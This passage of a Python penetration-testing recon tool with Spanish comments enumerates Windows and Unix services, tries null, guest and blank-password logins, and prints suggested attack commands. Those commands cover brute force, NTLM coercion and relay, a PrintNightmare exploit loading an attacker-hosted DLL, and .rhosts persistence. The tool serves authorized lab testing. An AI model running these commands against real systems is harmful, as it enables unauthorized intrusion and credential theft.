                    _step(res, f"{nxc} ldap {ip} -u '{user}' -p '' {mod}", rc == 0, out, note=note)
                    if mod == "--pass-pol":
                        pol = _parse_pass_pol(out)
                        pp = _format_pass_pol_finding(pol)
                        if pp:
                            res["findings"].append(("info", pp))
                        if pol.get("lockout_threshold") in ("None", "0"):
                            res["findings"].append(("media", "AD: sin bloqueo de cuentas (lockout = None/0) — no bloquea al validar credenciales"))
                # get-desc-users: módulo nxc dedicado a buscar contraseñas en el campo
                # "description" de las cuentas (fallo de higiene clásico en AD: alguien
                # apunta ahí la contraseña inicial/temporal). Antes solo quedaba como
                # sugerencia manual (con el nombre viejo del módulo, 'user-desc' — el
                # actual en la wiki de nxc es 'get-desc-users'). Formato de salida SIN
                # confirmar contra un run real (no hay ejemplo documentado en ningún
                # sitio) — por eso, igual que el spider de contenido, se usa el MISMO
                # regex genérico "esto podría ser una contraseña" sobre el output crudo
                # en vez de intentar parsear campos exactos que podrían no coincidir.
                rc, out = run_capture([nxc, "ldap", ip, "-u", user, "-p", "", "-M", "get-desc-users"], timeout=60)
                _step(res, f"{nxc} ldap {ip} -u '{user}' -p '' -M get-desc-users", rc == 0, out,
                      note="busca contraseñas en el campo 'description' de las cuentas de usuario (fallo de higiene clásico en AD)")
                if re.search(_SPIDER_SECRET_REGEX, out or "", re.I):
                    res["findings"].append(("alta",
                        "LDAP: la descripción de algún usuario podría contener una contraseña — "
                        "revisa la salida cruda del paso 'get-desc-users'"))
                # MachineAccountQuota: atributo del dominio, normalmente legible por cualquier
                # cuenta autenticada (y a veces por bind anónimo si el DC es laxo) — barato de
                # comprobar ya que el anónimo demostró poder leer (--users trajo datos arriba).
                rc, out = run_capture([nxc, "ldap", ip, "-u", user, "-p", "", "-M", "maq"], timeout=30)
                maq_f = _maq_finding(_parse_maq(out), prefix="AD")
                _step(res, f"{nxc} ldap {ip} -u '{user}' -p '' -M maq", maq_f is not None, out,
                      note="MachineAccountQuota: ¿cuántas cuentas de equipo puede unir al dominio una cuenta CUALQUIERA? (precondición de noPac/RBCD/Shadow Credentials)")
                if maq_f:
                    res["findings"].append(maq_f)
            else:
                res["findings"].append(("info",
                    "LDAP: bind anónimo aceptado pero sin lectura (el DC deniega la enum anónima) → "
                    "--groups/--pass-pol/get-desc-users necesitan credenciales (saltados: devolverían lo mismo)"))
        else:
            res["findings"].append(("info", "LDAP sin bind anónimo (null/guest no entran) → la enum LDAP necesita credenciales"))
        res["next"] += [
            f"nxc ldap {ip} -u USER -p PASS --asreproast asrep.txt   # (con creds) cuentas sin preauth → hash crackeable",
            f"nxc ldap {ip} -u USER -p PASS --kerberoasting kerb.txt   # (con creds) cuentas con SPN → hash crackeable",
        ]
    else:
        res["missing"].append("nxc/netexec")
    if have("ldapsearch"):
        rc, out = run_capture(["ldapsearch", "-x", "-H", f"ldap://{ip}", "-s", "base", "namingContexts"],
                              timeout=20)
        _step(res, f"ldapsearch -x -H ldap://{ip} -s base namingContexts", rc == 0, out,
              note="naming contexts (base DN), sin autenticar")
        ncs = re.findall(r"namingContexts:\s*(.+)", out)
        if ncs:
            res["findings"].append(("info", f"LDAP base DN: {', '.join(n.strip() for n in ncs[:4])}"))
            res["next"].append(f"ldapsearch -x -H ldap://{ip} -b {shlex.quote(ncs[0].strip())}   # volcado anónimo del árbol")
            # Trusts de dominio/bosque: objeto trustedDomain, de SOLO LECTURA y SIN credenciales
            # — casi siempre denegado en un AD mínimamente endurecido, pero gratis intentarlo
            # (mismo base DN ya resuelto arriba, ninguna consulta de red adicional de peso). nxc
            # NO tiene flag '--trusts' (ver _parse_ldap_trusts) — por eso ldapsearch.
            # _run_capture_retry (no run_capture a secas): visto en vivo contra un DC real de HTB,
            # esta MISMA consulta puede agotar el timeout con salida vacía mientras una repetición
            # manual (sin límite de tiempo) la devuelve completa al momento — fallo transitorio de
            # conexión, no ausencia real de trusts. Un reintento barato evita perder el hallazgo.
            base_dn = ncs[0].strip()
            rc, tout = _run_capture_retry(["ldapsearch", "-x", "-H", f"ldap://{ip}", "-b", base_dn,
                                           "(objectClass=trustedDomain)", "trustPartner", "trustDirection",
                                           "trustType", "trustAttributes"], timeout=20)
            trusts = _parse_ldap_trusts(tout)
            _step(res, f"ldapsearch -x -H ldap://{ip} -b {shlex.quote(base_dn)} '(objectClass=trustedDomain)'",
                  bool(trusts), tout, note="trusts de dominio/bosque, sin autenticar (casi siempre denegado, gratis intentarlo)")
            for t in trusts:
                scope = "TODO el bosque" if t["forest_transitive"] else "solo este dominio"
                res["findings"].append(("info", f"LDAP: trust con '{t['partner']}' — {t['direction']}, {t['type']}, alcance: {scope}"))
    else:
        res["missing"].append("ldapsearch (ldap-utils)")
    for lbl, txt in _nse_for(services, host, ("ldap",)):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap con sus scripts NSE para este servicio")
    return res


def fp_winrm(ip, ports, services, host, deep):
    """WinRM (5985/5986): la vía a shell remota (evil-winrm) con credenciales
    válidas. Se prueba el fallback null → guest → Administrator sin contraseña; un
    (Pwn3d!) aquí es shell directa. Validar listas de credenciales es manual."""
    res = _fp("winrm", "WinRM", [p["port"] for p in ports])
    pstr = ", ".join(str(p["port"]) for p in ports)
    res["findings"].append(("info", f"WinRM expuesto ({pstr}) — con credenciales válidas da shell (evil-winrm)"))
    nxc = nxc_bin()
    if nxc:
        nxc_auth(nxc, "winrm", ip, res)                # fallback null → guest → Administrator
    else:
        res["missing"].append("nxc/netexec")
    res["next"] += [
        f"evil-winrm -i {ip} -u USER -p PASS   # shell cuando tengas credenciales válidas",
        f"nxc winrm {ip} -u users.txt -p pass.txt --continue-on-success   # validar lista de credenciales (manual)",
    ]
    return res


def fp_ssh(ip, ports, services, host, deep):
    """SSH: consolida lo que saca nmap (algoritmos, métodos de auth, hostkeys). No
    se prueban contraseñas (el blank-password por SSH casi nunca existe y un intento
    por cuenta ya es spraying); validar credenciales queda como paso manual."""
    res = _fp("ssh", "SSH", [p["port"] for p in ports])
    for lbl, txt in _nse_for(services, host, ("ssh",)):
        _step(res, f"nmap {lbl}", True, txt,
              note="algoritmos, métodos de autenticación y hostkeys que ya sacó nmap")
    res["next"] += [
        f"nxc ssh {ip} -u users.txt -p pass.txt --continue-on-success   # validar credenciales (manual)",
        f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{ip}   # fuerza bruta (manual; ojo a bloqueos)",
        f"ssh {ip} -oPreferredAuthentications=none   # ver métodos ofertados / banner de usuario",
    ]
    return res


def fp_rservices(ip, ports, services, host, deep):
    """R-Services — rexec(512)/rlogin(513)/rsh(514): los 'r-commands' de UNIX antiguos
    (Solaris/AIX/HP-UX). No cifran y su 'autenticación' se basa en CONFIANZA: si el
    host/usuario que se conecta figura en /etc/hosts.equiv o ~/.rhosts del objetivo,
    entra SIN contraseña. NO se intenta rlogin automático: abre una sesión interactiva
    que se quedaría colgada esperando input; se dan los comandos para probarlo a mano."""
    res = _fp("rservices", "R-Services", [p["port"] for p in ports])
    pstr = ", ".join(str(p["port"]) for p in ports)
    res["findings"].append(("media",
        f"R-Services expuestos ({pstr}): auth por confianza (.rhosts / hosts.equiv) — "
        "rlogin/rsh entran SIN contraseña si el host/usuario está en la lista de confianza"))
    if have("rusers"):                                 # consulta NO interactiva de sesiones activas
        rc, out = run_capture(["rusers", "-al", ip], timeout=20)
        _step(res, f"rusers -al {ip}", rc == 0, out,
              note="usuarios con sesión en el host (vía rpc.rusersd): da nombres reales para probar en rlogin")
    else:
        res["missing"].append("rusers (paquete 'rusers'/'rstat-client')")
    res["next"] += [
        f"rlogin {ip} -l root        # probar la confianza como root (y usuarios comunes: admin, user, htb-student)",
        f"rsh {ip} -l root id        # ejecutar un comando si la confianza existe (no interactivo)",
        f"rusers -al {ip}            # usuarios con sesión activa (si responde rpc.rusersd)",
        "Con acceso a una cuenta: añade '<tu_ip> <user>' a su ~/.rhosts para conservar la confianza",
    ]
    return res


def fp_rdp(ip, ports, services, host, deep):
    """RDP (3389): prueba el fallback null → guest → Administrator sin contraseña
    y consolida lo que nmap sabe (NLA, cifrado, NTLM-info, que delata hostname y
    dominio). Un (Pwn3d!) sería acceso gráfico directo."""
    res = _fp("rdp", "RDP", [p["port"] for p in ports])
    res["findings"].append(("info",
        "RDP: PRECAUCIÓN — nxc marca (Pwn3d!) en CUALQUIER login RDP válido (al revés que en SMB/WMI, "
        "no comprueba admin: pone admin_privs=True nada más conectar): confirma ACCESO interactivo, NO "
        "que seas admin → verifícalo dentro con 'whoami /groups'. Evita el spraying de muchas contraseñas "
        "por RDP (puede bloquear cuentas); y los scripts nmap 'rdp-*' dejan la cookie mstshash=nmap "
        "que un EDR detecta."))
    nxc = nxc_bin()
    if nxc:
        nxc_auth(nxc, "rdp", ip, res)                  # fallback null → guest → Administrator
    else:
        res["missing"].append("nxc/netexec")
    for lbl, txt in _nse_for(services, host, ("rdp",)):
        _step(res, f"nmap {lbl}", True, txt,
              note="NLA/cifrado y datos NTLM (hostname, dominio, versión) que ya sacó nmap")
    res["next"].append(f"xfreerdp /v:{ip} /u:USER /p:PASS +clipboard /cert:ignore   # conectar con credenciales")
    return res


def fp_vnc(ip, ports, services, host, deep):
    """VNC (5900+): comprueba con nxc si el servidor acepta acceso SIN contraseña
    (o con una muy débil) — un clásico de paneles de administración olvidados."""
    res = _fp("vnc", "VNC", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        rc, out = run_capture([nxc, "vnc", ip], timeout=40)
        _step(res, f"{nxc} vnc {ip}", rc == 0, out,
              note="¿el VNC acepta conexión sin autenticación? (nxc prueba el puerto 5900 por defecto)")
        if re.search(r"\(Pwn3d!\)|No Authentication|without password", out, re.I):
            res["findings"].append(("critica", "VNC: posible acceso remoto gráfico SIN autenticación"))
    else:
        res["missing"].append("nxc/netexec")
    res["next"].append(f"vncviewer {ip}::PUERTO   # conectar (prueba cada puerto VNC abierto)")
    return res


def _condense_rpcdump(out):
    """rpcdump escupe cientos de bindings ncalrpc LOCALES (ruido, no alcanzables por
    red). Nos quedamos con los endpoints con nombre (Protocol: [MS-…]) y los bindings
    alcanzables por red (ncacn_ip_tcp / ncacn_np), que son los que importan para pivotar."""
    keep = [ln for ln in out.splitlines()
            if "Protocol:" in ln or "ncacn_ip_tcp" in ln or "ncacn_np" in ln
            or "Retrieving endpoint" in ln]
    if not keep:
        return out
    extra = out.count("ncalrpc:")
    txt = "\n".join(keep)
    if extra:
        txt += f"\n… (+{extra} bindings ncalrpc locales omitidos — solo accesibles en la propia máquina)"
    return txt


_SPOOLER_RPC_RX = re.compile(r"\[MS-(RPRN|PAR)\]")   # Print System (Async) Remote Protocol: endpoints
# que rpcdump.py imprime tal cual como "Protocol: [MS-RPRN]: Print System Remote Protocol" —
# formato estable de impacket, no un módulo nuevo/sin confirmar como el de get-desc-users.
_EFSRPC_RPC_RX = re.compile(r"\[MS-EFSR\]")   # OJO: NO es "[MS-EFSRPC]" (fácil de adivinar mal,
# como ya pasó con LAPS siendo LDAP y no SMB) — confirmado en el código fuente de impacket
# (impacket/dcerpc/v5/epm.py, tabla KNOWN_PROTOCOLS): la entrada real es
# '[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol'. A diferencia del spooler
# (MS-RPRN/MS-PAR, que PrintNightmare hizo que muchos entornos deshabiliten), MS-EFSR suele
# estar expuesta en CUALQUIER DC por defecto — es el vector principal de PetitPotam
# (CVE-2021-36942), no uno secundario.


def fp_msrpc(ip, ports, services, host, deep):
    """MSRPC / WMI (135): WMI es otra vía de ejecución remota en Windows; se prueba
    el fallback de credenciales por defecto. rpcdump lista los endpoints RPC
    expuestos, que revelan servicios internos accesibles — entre ellos, si el
    servicio de impresión (spooler) está expuesto por red: superficie de
    PrinterBug/PrintNightmare. Antes esto quedaba como sugerencia manual (un grep
    sobre la MISMA salida que ya se capturaba); ahora se mira directamente, sin
    volver a lanzar rpcdump."""
    res = _fp("msrpc", "MSRPC / WMI", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        nxc_auth(nxc, "wmi", ip, res)                  # fallback null → guest → Administrator
    else:
        res["missing"].append("nxc/netexec")
    rpcdump = _rpcdump_bin()
    spooler = efsrpc = False
    if rpcdump:
        rc, out = run_capture([rpcdump, ip], timeout=40)
        _step(res, f"{rpcdump} {ip}", rc == 0, _condense_rpcdump(out),
              note="lista los endpoints RPC expuestos: destapa servicios internos (spooler, eventlog, task scheduler…). Se omiten los cientos de bindings ncalrpc LOCALES (ruido, no accesibles por red)")
        if _SPOOLER_RPC_RX.search(out or ""):
            spooler = True
            res["findings"].append(("alta",
                "MSRPC: servicio de impresión expuesto por red (MS-RPRN/MS-PAR) — superficie para "
                "PrinterBug (coacciona autenticación del equipo) y PrintNightmare (CVE-2021-34527)"))
        if _EFSRPC_RPC_RX.search(out or ""):
            efsrpc = True
            res["findings"].append(("alta",
                "MSRPC: interfaz MS-EFSR expuesta por red — superficie para PetitPotam (CVE-2021-36942): "
                "coacciona al equipo a autenticarse contra tu máquina (captura/relay NTLM), sin depender del spooler"))
    else:
        res["missing"].append("impacket-rpcdump")
    for lbl, txt in _nse_for(services, host, ("msrpc", "rpcinfo")):
        _step(res, f"nmap {lbl}", True, txt, note="endpoints RPC que ya enumeró nmap")
    coerce = spooler or efsrpc
    coerce_via = "/".join(v for v, hit in (("MS-RPRN/MS-PAR", spooler), ("MS-EFSR", efsrpc)) if hit)
    # Metadata interna para _combine_relay_opportunity (run_one): si fp_smb confirmó SMB signing
    # no requerido en el MISMO host, combina esta coacción con eso para un next-step de relay
    # reflexivo concreto (ver el comentario simétrico en fp_smb, junto a '_signing_disabled').
    res["_coerce"] = coerce
    res["_coerce_via"] = coerce_via
    if coerce:
        # coercer (p0dalirius/Coercer) prueba varios métodos MS-EFSR/MS-RPRN por sí solo y ha
        # sustituido en la práctica usar PetitPotam.py/PrinterBug.py sueltos — se deja éste como
        # alternativa EFSR-only (sintaxis real de cada herramienta, no un híbrido inventado: ni
        # PetitPotam.py ni coercer aceptan '-t ip -l ip', eso era de una versión anterior de este
        # next-step). La coacción por sí sola no basta: hace falta algo escuchando ANTES de
        # dispararla (siguiente next-step).
        res["next"].append(
            f"coercer coerce -u USER -p PASS -d DOMINIO --target-ip {ip} --listener-ip TU_IP   "
            f"# {coerce_via} ya confirmado expuesto arriba: fuerza al equipo a autenticarse contra "
            f"tu listener (alternativa EFSR-only sin coercer: petitpotam.py -u USER -p PASS -d "
            f"DOMINIO TU_IP {ip})")
        # El destino del relay es el PROPIO listener de arriba: contra la CA (ESC8) si hay AD CS
        # en el dominio, o contra LDAP(S) si no — certipy (>=5.x) trae 'relay' integrado como
        # alternativa de un solo paso a ntlmrelayx.py+gettgtpkinit.py.
        res["next"].append(
            "ntlmrelayx.py -t http://CA_FQDN/certsrv/certfnsh.asp --adcs --template DomainController   "
            "# EN PARALELO a la coacción de arriba, ANTES de dispararla: reenvía esa autenticación a "
            "la Certificate Authority (ESC8) en vez de a LDAP — sustituye CA_FQDN por la CA real; "
            "'certipy relay -target http://CA_FQDN -template DomainController' hace relay+petición de "
            "certificado en un solo paso si tienes certipy")
        if spooler:
            # PrintNightmare es RCE directo (no necesita coacción): el spooler expuesto YA es el
            # vector. Necesita el FORK de impacket de cube0x0, no el paquete oficial — y solo
            # funciona si el objetivo no tiene el hardening de Point and Print (de serie desde las
            # actualizaciones de 2021 en builds parcheadas; sigue siendo habitual en labs/imágenes
            # antiguas tipo HTB/OSCP).
            res["next"].append(
                "git clone https://github.com/cube0x0/impacket && cd impacket && python3 ./setup.py "
                f"install   # PrintNightmare (CVE-2021-34527/CVE-2021-1675) necesita el fork de "
                f"impacket de cube0x0 (el oficial NO sirve) — luego: python3 CVE-2021-1675.py "
                f"DOMINIO/USER:PASS@{ip} '\\\\TU_IP\\share\\payload.dll'   # RCE directo si el "
                "spooler no está parcheado/endurecido")
    else:
        res["next"].append(
            f"impacket-rpcdump {ip} | grep -iE 'MS-RPRN|MS-PAR|MS-EFSR|spool'   # ¿expone superficie de coacción NTLM? (PrinterBug/PetitPotam)")
    res["next"] += [
        f"impacket-wmiexec DOMINIO/USER:PASS@{ip}   # RCE por WMI con credenciales válidas (DOMINIO/ opcional en un Windows suelto sin AD)",
        f"nxc smb {ip} -u USER -p PASS -x whoami   # ejecución remota con credenciales",
    ]
    return res


def fp_mssql(ip, ports, services, host, deep):
    """MSSQL (1433): el fallo clásico es la cuenta 'sa' con contraseña vacía; si
    entra, xp_cmdshell suele dar RCE. Se prueba 'sa' y sesión nula (sin contraseña),
    un intento por cuenta — no es fuerza bruta."""
    res = _fp("mssql", "MSSQL", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        for user, lbl in (("sa", "'sa' sin contraseña"), ("", "sesión nula (Windows auth)")):
            rc, out = run_capture([nxc, "mssql", ip, "-u", user, "-p", ""], timeout=40)
            ok = _nxc_ok(out)
            _step(res, f"{nxc} mssql {ip} -u '{user}' -p ''", ok, out,
                  note=f"probar {lbl} (MSSQL a menudo trae 'sa' sin contraseña → xp_cmdshell → RCE)")
            if re.search(r"\(Pwn3d!\)", out) or ok:
                res["findings"].append(("critica", f"MSSQL: login como {lbl} (posible RCE vía xp_cmdshell)"))
                res["next"].append(f"nxc mssql {ip} -u {user or 'USER'} -p '' -x 'whoami'   # si hay exec habilitado, RCE")
                res["next"].append(f"impacket-mssqlclient {user or 'sa'}:''@{ip}  ->  EXEC master..xp_dirtree '\\\\TU_IP\\share', 1, 1   # fuerza auth NTLM saliente hacia ti (coerción, misma familia que PrinterBug) — captúrala con responder/ntlmrelayx")
                res["next"].append(f"impacket-mssqlclient {user or 'sa'}:''@{ip}  ->  EXEC sp_linkedservers; luego EXECUTE('SELECT 1') AT [servidor_enlazado]   # pivota a otra instancia SQL si hay linked servers configurados")
                break
    else:
        res["missing"].append("nxc/netexec")
    for lbl, txt in _nse_for(services, host, ("ms-sql",)):
        _step(res, f"nmap {lbl}", True, txt, note="instancia, versión y NTLM-info de MSSQL que ya sacó nmap")
    if looks_domain_joined(services, host):
        res["next"].append(f"impacket-mssqlclient Administrator@{ip} -windows-auth   # Windows auth con credenciales de DOMINIO")
    else:
        res["next"].append(f"impacket-mssqlclient sa:'PASS'@{ip}   # SQL auth (workgroup: no uses -windows-auth de dominio; prueba 'sa' u otra cuenta SQL)")
    return res


def _is_iis(p):
    """¿El servicio web es IIS/ASP.NET? (por producto o cabeceras ya recogidas)."""
    blob = " ".join([p["product"], p["version"], p["extrainfo"], p["name"],
                     p["scripts"].get("http-server-header", ""),
                     p["scripts"].get("http-headers", "")]).lower()
    # OJO: Microsoft-HTTPAPI NO es IIS (es HTTP.sys, lo usa WinRM/WSMan); IIS se
    # anuncia como "Microsoft-IIS/x" → "iis" lo capta y HTTPAPI no.
    return "iis" in blob or "asp.net" in blob or "aspnet" in blob


# Ficheros web sensibles que se comprueban con un GET de SOLO LECTURA. El 3er campo
# es un regex que DEBE aparecer en el cuerpo para contar como hallazgo: evita el
# falso positivo típico de IIS/Apache devolviendo 200 (o una página de error) a todo.
WEB_SENSITIVE = {
    "aspnet": [
        ("trace.axd", "trace.axd de ASP.NET (traza de peticiones: cookies, sesiones, datos)",
         r"Application Trace|Requests to this Application|Microsoft \.NET|Trace Information"),
        ("elmah.axd", "ELMAH elmah.axd (log de errores con datos sensibles)",
         r"Error Log for|ELMAH|Powered by ELMAH"),
        ("web.config", "web.config accesible (cadenas de conexión, secretos)",
         r"<configuration|<\?xml|<connectionStrings|<appSettings"),
    ],
    "any": [
        (".git/HEAD", ".git/ expuesto (repositorio descargable → código fuente)",
         r"ref:\s*refs/|^[0-9a-f]{40}"),
        (".env", ".env expuesto (variables de entorno/secretos de la app)",
         r"(?mi)^[A-Z0-9_]{2,}="),
        ("server-status", "Apache server-status (peticiones y clientes en vivo)",
         r"Apache Server Status|Server Version|Requests currently being processed"),
        ("phpinfo.php", "phpinfo() expuesto (config PHP, rutas absolutas, módulos)",
         r"phpinfo\(\)|PHP Version\s*=>|<title>phpinfo"),
    ],
}

# URIs .well-known (RFC 8615): no son un fallo de config como WEB_SENSITIVE — su
# existencia es normal/esperada —, pero son intel de recon útil (endpoints OAuth,
# contacto de seguridad real), así que van con severidad "info" propia, no con la
# heurística de WEB_SENSITIVE (que marcaría "media" por defecto).
WEB_WELL_KNOWN = [
    (".well-known/security.txt", "security.txt (RFC 9116): contacto/política real de seguridad del sitio",
     r"Contact:|Policy:|Encryption:|Acknowledg"),
    (".well-known/openid-configuration", "OpenID Connect discovery: endpoints OAuth2 (authorization/token/userinfo/jwks)",
     r'"issuer"\s*:|"authorization_endpoint"\s*:|"token_endpoint"\s*:'),
]

# whatweb mete el nombre del CMS como plugin ("WordPress[6.4.2]") o, si no tiene firma
# propia para la versión, aparece igual en el MetaGenerator ("MetaGenerator[WordPress 6.4]").
_CMS_RE = {"wordpress": re.compile(r"\bWordPress\b", re.I), "joomla": re.compile(r"\bJoomla\b", re.I)}


def _detect_cms(whatweb_out):
    """¿Qué CMS delata whatweb? 'wordpress'/'joomla'/None (puro — testable sin red)."""
    for name, rx in _CMS_RE.items():
        if rx.search(whatweb_out or ""):
            return name
    return None


# Tokens 'Nombre[valor]' de whatweb que son ruido de fingerprinting (framework JS,
# cabeceras genéricas, metadatos de la página) — no "un producto" al que le pueda
# haber quedado una credencial de fábrica puesta. Lo que SÍ queda tras filtrar esto
# (Apache/Jenkins/Grafana/Tomcat/phpMyAdmin/Webmin…) es justo lo que vale la pena
# buscar en DefaultCreds-cheat-sheet — WordPress/Joomla se excluyen aparte (ya
# tienen su propia sugerencia, mejor dirigida: wpscan/joomscan hacen MUCHO más que
# solo mirar credenciales por defecto).
_WHATWEB_PRODUCT_IGNORE = {
    "ip", "country", "title", "script", "email", "cookies", "httponly",
    "uncommonheaders", "x-powered-by", "x-frame-options", "x-ua-compatible",
    "strict-transport-security", "html5", "jquery", "bootstrap", "modernizr",
    "google-analytics", "google-tag-manager", "open-graph-protocol", "viewport",
    "metagenerator", "frame", "object", "redirectlocation", "via-proxy",
    "content-security-policy-report-only", "httpserver",
}

# Servidor web / runtime genérico: whatweb SÍ les pone versión (Apache[2.4.41],
# PHP[8.1.2]…) así que no caen en _WHATWEB_PRODUCT_IGNORE de arriba (esa lista es
# para ruido de fingerprinting, no para "genérico vs específico"), pero NUNCA son
# ellos mismos "el panel de login con credencial por defecto" — solo ensucian la
# tabla de `creds search` con decenas de productos "apache algo" sin relación real
# con lo que hay instalado. Exclusión propia, solo para la Fase 6 (creds search).
_CREDS_SEARCH_IGNORE = {
    "apache", "apache-coyote", "nginx", "php", "openssl", "iis", "microsoft-iis",
    "litespeed",
}


def _whatweb_products(whatweb_out, exclude=()):
    """Nombres de producto/tecnología que whatweb reconoce con firma propia (tokens
    'Nombre[valor]' de su salida -a 3, p. ej. 'Jenkins[2.303]' o 'Grafana[8.3.0]') —
    filtra el ruido de fingerprinting (_WHATWEB_PRODUCT_IGNORE) y lo que se pase en
    `exclude` (en minúsculas). Orden de aparición, sin duplicados. Puro, testable
    sin red — usado para sugerir una búsqueda en DefaultCreds-cheat-sheet, no para
    nada que palantir ejecute solo."""
    seen, out = set(), []
    for m in re.finditer(r"([A-Za-z][\w.+-]*)\[[^\]]*\]", whatweb_out or ""):
        name = m.group(1)
        key = name.lower()
        if key in _WHATWEB_PRODUCT_IGNORE or key in exclude or key in seen:
            continue
        seen.add(key)
        out.append(name)
    return out


def _parse_creds_search(out):
    """Filas (producto, usuario, password) de la tabla ASCII de `creds search`
    (puro, sin red — testable con una salida fija en --selftest). Formato real
    confirmado en vivo (herramienta `creds` de DefaultCreds-cheat-sheet):
        +----------+----------+----------+
        | Product  | username | password |
        +----------+----------+----------+
        | tomcat   |  admin   |  admin   |
        +----------+----------+----------+
    "<blank>" es su forma de marcar un campo vacío → se normaliza a "". Sin
    ningún match, la herramienta imprime "[-] Product not found in database"
    SIN tabla (ninguna línea empieza por '|') → devuelve []."""
    rows = []
    for line in (out or "").splitlines():
        line = line.strip()
        if not line.startswith("|"):
            continue
        cells = [c.strip() for c in line.strip("|").split("|")]
        if len(cells) != 3:
            continue
        product, user, pw = cells
        if product.lower() == "product":          # fila de cabecera, no es un dato
            continue
        rows.append((product, "" if user == "<blank>" else user,
                              "" if pw == "<blank>" else pw))
    return rows


_EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
_HTML_COMMENT_RE = re.compile(r"<!--(.*?)-->", re.S)


def _extract_emails_comments(body):
    """Emails y comentarios HTML de un body (puro, testable sin red). Es lo que
    ReconSpider (Scrapy, del módulo Crawling de HTB Academy) separa en 'emails'/
    'comments' de su results.json — aquí sin esa dependencia, con dos regex sobre
    el body que ya trae `_http_get`. `re.S` para que el comentario cace aunque
    ocupe varias líneas."""
    emails = sorted(set(_EMAIL_RE.findall(body or "")))
    comments = [c.strip() for c in _HTML_COMMENT_RE.findall(body or "") if c.strip()]
    return emails, comments


def _parse_katana_jsonl(out):
    """URLs/endpoints reales descubiertos por katana (jsonl, -or -ob: sin cuerpo/raw)
    + cuáles tenían formularios (-fx). Tolerante a líneas rotas/no-JSON (nunca lanza
    — puro, testable sin red). Esquema real: la URL vive en request.endpoint, los
    formularios (si los hay) en response.forms."""
    urls, forms = [], []
    for line in (out or "").splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            d = json.loads(line)
        except json.JSONDecodeError:
            continue
        u = (d.get("request") or {}).get("endpoint")
        if not u:
            continue
        urls.append(u)
        if (d.get("response") or {}).get("forms"):
            forms.append(u)
    return {"urls": sorted(set(urls)), "forms": sorted(set(forms))}


def _wpscan_summary(out):
    """De la salida JSON de wpscan (-f json): (componente, nº vulns) por plugin/tema/core
    con vulnerabilidades conocidas + usuarios enumerados. Tolerante a JSON roto/parcial
    (nunca lanza — puro, testable con una salida fija)."""
    try:
        data = json.loads(out)
    except (json.JSONDecodeError, TypeError):
        return None
    comps = []
    ver = data.get("version") or {}
    vulns = ver.get("vulnerabilities") or []
    if vulns:
        comps.append((f"core {ver.get('number', '?')}", len(vulns)))
    for kind in ("plugins", "themes"):
        for name, info in (data.get(kind) or {}).items():
            vulns = (info or {}).get("vulnerabilities") or []
            if vulns:
                comps.append((name, len(vulns)))
    users = sorted((data.get("users") or {}).keys())
    return {"components": comps, "users": users, "total_vulns": sum(n for _, n in comps)}


# nuclei severity → severidad de palantir. 'low' cae a 'info' (SEV_ORDER no tiene 'baja',
# que se reserva para los exploits de searchsploit); se conserva la etiqueta original en
# el texto del hallazgo para no perder el matiz.
_NUCLEI_SEV = {"critical": "critica", "high": "alta", "medium": "media",
               "low": "info", "info": "info", "unknown": "info"}


def _nuclei_summary(out):
    """Parsea la salida JSONL de nuclei (-jsonl) → lista de hallazgos
    {sev, raw, id, name, at}, ordenada por severidad. Pura y tolerante a líneas
    que no sean JSON (banner, avisos) → testable sin red."""
    found = []
    for line in (out or "").splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            d = json.loads(line)
        except (json.JSONDecodeError, ValueError):
            continue
        info = d.get("info") or {}
        raw = str(info.get("severity", "unknown")).lower()
        found.append({
            "sev": _NUCLEI_SEV.get(raw, "info"), "raw": raw,
            "id": d.get("template-id") or d.get("templateID") or "?",
            "name": info.get("name", ""),
            "at": d.get("matched-at") or d.get("matched_at") or d.get("host", ""),
        })
    found.sort(key=lambda f: (SEV_ORDER.get(f["sev"], 9), f["id"]))
    return found


def _nuclei_templates_present():
    """¿Están ya descargadas las plantillas de nuclei? Decide si saltamos el update-check
    con -duc (si están, no hace falta tocar la red en cada run). Mira las rutas por defecto
    bajo el home del usuario REAL (bajo sudo, no /root) y respeta NUCLEI_TEMPLATES_DIR."""
    env = os.environ.get("NUCLEI_TEMPLATES_DIR")
    cands = [Path(env)] if env else []
    home = default_outdir_home()
    cands += [home / "nuclei-templates", home / ".local" / "nuclei-templates",
              home / ".config" / "nuclei" / "nuclei-templates"]
    for d in cands:
        try:
            if d.is_dir() and next(d.iterdir(), None) is not None:
                return True
        except OSError:
            pass
    return False


# Señales en la salida de nuclei de que no hay plantillas en disco (para avisar con el fix).
_NUCLEI_NO_TPL_RE = re.compile(
    r"(?i)no templates (were )?found|could not find any templates|no templates provided|"
    r"templates directory does not exist|-update-templates")


def _http_get(url, timeout=8, method="GET", host=None, follow=True, max_bytes=65536):
    """GET/OPTIONS sin autenticar. Devuelve (status, {headers en minúscula}, cuerpo[max_bytes]).
    (None, {}, '') ante error de red/URL. Ignora el certificado TLS (labs).
    `max_bytes`: cuántos bytes del cuerpo leer (def. 64 KiB — un robots.txt o un
    security.txt largos no se truncan a mitad y pierden rutas; antes eran 4 KiB).
    `host`: fuerza la cabecera Host (para comprobar vhosts por IP sin tocar /etc/hosts).
    `follow`: si False, NO sigue redirects → devuelve el 30x con su cabecera Location
    (urllib los sigue por defecto; sin esto no se puede ver que un 80 solo reenvía a su 443)."""
    import urllib.request
    import urllib.error
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    headers = {"User-Agent": "palantir"}
    if host:
        headers["Host"] = host
    req = urllib.request.Request(url, method=method, headers=headers)
    _log(f"{method} {url}")
    handlers = [urllib.request.HTTPSHandler(context=ctx)]
    if not follow:
        class _NoFollow(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **k):
                return None                        # no seguir: el 30x sube como HTTPError y lo devolvemos tal cual
        handlers.append(_NoFollow)
    opener = urllib.request.build_opener(*handlers)
    try:
        with opener.open(req, timeout=timeout) as r:
            hdrs = {k.lower(): v for k, v in r.headers.items()}
